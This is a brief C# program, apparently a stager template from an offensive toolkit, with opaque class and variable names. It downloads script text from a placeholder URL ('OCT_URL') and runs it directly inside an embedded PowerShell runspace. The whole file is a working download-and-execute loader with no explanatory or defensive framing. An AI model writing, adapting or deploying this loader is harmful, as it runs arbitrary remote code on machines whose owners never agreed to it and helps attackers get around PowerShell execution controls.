using System.Management.Automation;
using System.Runtime.InteropServices;
using System.Net;
using System;

namespace TTT
{
    class TNoT
    {


        static void Main()
        {


		WebClient CC = new WebClient();
		String code = CC.DownloadString("OCT_URL");
		PowerShell pp = PowerShell.Create();
		pp.AddScript(code);
		pp.Invoke();



        }
    }
}
